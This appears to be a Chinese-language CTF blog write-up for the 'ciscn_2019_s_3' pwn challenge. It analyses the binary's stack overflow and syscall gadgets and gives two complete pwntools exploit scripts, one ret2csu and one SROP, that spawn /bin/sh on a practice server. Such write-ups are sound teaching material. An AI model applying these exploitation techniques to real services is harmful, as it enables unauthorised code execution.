@@ -1,0 +1,215 @@
+---
+layout: post
+title:  ciscn_2019_s_3
+date:   2021-02-05 00:01:01 +0300
+image:  2021-02-05-sleigh-ride.jpg
+tags:   [ctf,PWN,ciscn2019,ret2csu,SROP]
+---
+
+**main()**
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  return vuln();
+}
+```
+
+**vuln()**
+
+```assembly
+signed __int64 vuln()
+{
+  signed __int64 result; // rax
+
+  __asm { syscall; LINUX - sys_read }
+  result = 1LL;
+  __asm { syscall; LINUX - sys_write }
+  return result;
+}
+```
+
+其实这个函数不能从反汇编的结果来看，这样什么都看不出来，应该直接看汇编。
+
+```assembly
+.text:00000000004004ED
+.text:00000000004004ED ; =============== S U B R O U T I N E ============================
+.text:00000000004004ED
+.text:00000000004004ED ; Attributes: bp-based frame
+.text:00000000004004ED
+.text:00000000004004ED                 public vuln
+.text:00000000004004ED vuln            proc near               ; CODE XREF: main+14↓p
+.text:00000000004004ED
+.text:00000000004004ED buf             = byte ptr -10h
+.text:00000000004004ED
+.text:00000000004004ED ; __unwind {
+.text:00000000004004ED                 push    rbp
+.text:00000000004004EE                 mov     rbp, rsp
+.text:00000000004004F1                 xor     rax, rax
+.text:00000000004004F4                 mov     edx, 400h       ; count
+.text:00000000004004F9                 lea     rsi, [rsp+buf]  ; buf
+.text:00000000004004FE                 mov     rdi, rax        ; fd
+.text:0000000000400501                 syscall                 ; LINUX - sys_read
+.text:0000000000400503                 mov     rax, 1
+.text:000000000040050A                 mov     edx, 30h        ; count
+.text:000000000040050F                 lea     rsi, [rsp+buf]  ; buf
+.text:0000000000400514                 mov     rdi, rax        ; fd
+.text:0000000000400517                 syscall                 ; LINUX - sys_write
+.text:0000000000400519                 retn
+.text:0000000000400519 vuln            endp ; sp-analysis failed
+.text:0000000000400519
+.text:0000000000400519 ; ----------------------------------------------------------------
+```
+
+buf大小为0x10
+
+可以看到";"后的注释给出了参数count，buf，fd。因此可以确定为:
+
+```assembly
+read(0,buf,0x400);
+write(1,buf,0x30);
+```
+
+存在溢出。
+
+但是函数中没有leave，只有ret，
+
+leave这个指令等价于
+
+```assembly
+mov	esp, ebp
+pop	ebp
+```
+
+释放早先的ENTER指令设置的堆栈帧。LEAVE指令将帧指针（在EBP寄存器中）复制到堆栈指针寄存器 (ESP)，从而释放分配给堆栈帧的堆栈空间。然后，旧的帧指针（由ENTER指令保存的调用过程的帧指针）从堆栈弹入 EBP 寄存器，从而恢复调用过程的堆栈帧。
+
+所以溢出为0x10。
+
+**gadgets()**函数也要从汇编看
+
+```assembly
+.text:00000000004004D6
+.text:00000000004004D6 ; =============== S U B R O U T I N E ============================
+.text:00000000004004D6
+.text:00000000004004D6 ; Attributes: bp-based frame
+.text:00000000004004D6
+.text:00000000004004D6                 public gadgets
+.text:00000000004004D6 gadgets         proc near
+.text:00000000004004D6 ; __unwind {
+.text:00000000004004D6                 push    rbp
+.text:00000000004004D7                 mov     rbp, rsp
+.text:00000000004004DA                 mov     rax, 0Fh
+.text:00000000004004E1                 retn
+.text:00000000004004E1 gadgets         endp ; sp-analysis failed
+.text:00000000004004E1
+.text:00000000004004E2 ; ----------------------------------------------------------------
+.text:00000000004004E2                 mov     rax, 3Bh
+.text:00000000004004E9                 retn
+.text:00000000004004E9 ; ----------------------------------------------------------------
+.text:00000000004004EA                 db 90h
+.text:00000000004004EB ; ----------------------------------------------------------------
+.text:00000000004004EB                 pop     rbp
+.text:00000000004004EC                 retn
+.text:00000000004004EC ; } // starts at 4004D6
+```
+
+其中有两个指令：mov rax,0fh 以和mov rax 3Bh。这两个gadget控制了rax的值，看看这两个是什么系统调用。
+
+x86_64 (64-bit)中
+
+|  NR  | syscall name | %rax |     arg0 (%rdi)      |       arg1 (%rsi)       |       arg2 (%rdx)       | arg3 (%r10) | arg4 (%r8) | arg5 (%r9) |
+| :--: | :----------: | :--: | :------------------: | :---------------------: | :---------------------: | :---------: | :--------: | :--------: |
+|  15  | rt_sigreturn | 0x0f |          ?           |            ?            |            ?            |      ?      |     ?      |     ?      |
+|  59  |    execve    | 0x3b | const char *filename | const char *const *argv | const char *const *envp |      -      |     -      |     -      |
+
+通过sys_execve()可以控制寄存器的值调用execve("/bin/sh",0,0)
+
+这里要注意的是，第一次溢出返回的函数不同，栈的布局也是不同的。
+
+返回vuln()函数的栈布局
+
+![]({{site.baseurl}}/img/2021-02-05-vuln.jpg)
+
+还要注意的是
+
+```
+call    qword ptr [r12+rbx*8]
+```
+
+r12+rbx*8并不是接下来要执行的地址，而是存放接下来要执行语句的地址。
+
+即**[r12+rbx\*8]**代表的是**r12 +** **rbx\*8**此**地址上的内容**。
+
+```assembly
+from pwn import *
+
+context.log_level = 'debug'
+
+io = remote("node3.buuoj.cn",29151)
+
+main = 0x40051d
+vuln = 0x4004ED
+payload = "/bin/sh\x00" + "a"*8 + p64(vuln)
+io.sendline(payload)
+
+io.recv(0x20)
+addr = u64(io.recv(8))
+print(hex(addr))
+
+binsh = addr - 0x118
+
+pop_rbx_rbp_r12_r13_r14_r15 = 0x40059A
+mov = 0x400580
+mov_rax = 0x04004E2
+pop_rdi = 0x4005A3
+syscall = 0x400501
+payload = "/bin/sh\x00"  + "b"*8 + p64(mov_rax) + p64(pop_rbx_rbp_r12_r13_r14_r15)
+payload += p64(0) + p64(1) + p64(binsh+0x10) + p64(0) + p64(0) + p64(0)
+payload += p64(mov) + "c"*(8*6 + 8)
+# mov的操作将会抬升8*7共56字节的栈空间，
+# 因此我们还需要提供56个字节的垃圾数据进行填充，
+# 然后再拼接上retn要跳转的地址。
+payload += p64(pop_rdi) + p64(binsh) + p64(syscall)
+io.sendline(payload)
+
+io.interactive()
+```
+
+### SOP
+
+```
+from pwn import *
+
+# context.log_level = 'debug'
+
+io = remote("node3.buuoj.cn",29151)
+
+elf = ELF("./ciscn_s_3")
+context.arch = elf.arch
+
+main = 0x40051d
+vuln = 0x4004ED
+payload = "/bin/sh\x00" + "a"*8 + p64(vuln)
+io.sendline(payload)
+
+io.recv(0x20)
+addr = u64(io.recv(8))
+print(hex(addr))
+
+binsh = addr - 0x118
+syscall = 0x400501
+
+sigframe = SigreturnFrame()
+sigframe.rax = constants.SYS_execve
+sigframe.rdi = binsh
+sigframe.rsi = 0
+sigframe.rdx = 0
+sigframe.rip = syscall
+
+sigreturn = 0x4004DA
+payload = "/bin/sh\x00/bin/sh\x00" + p64(sigreturn) + p64(syscall) + str(sigframe)
+io.sendline(payload)
+
+io.interactive()
+```
+
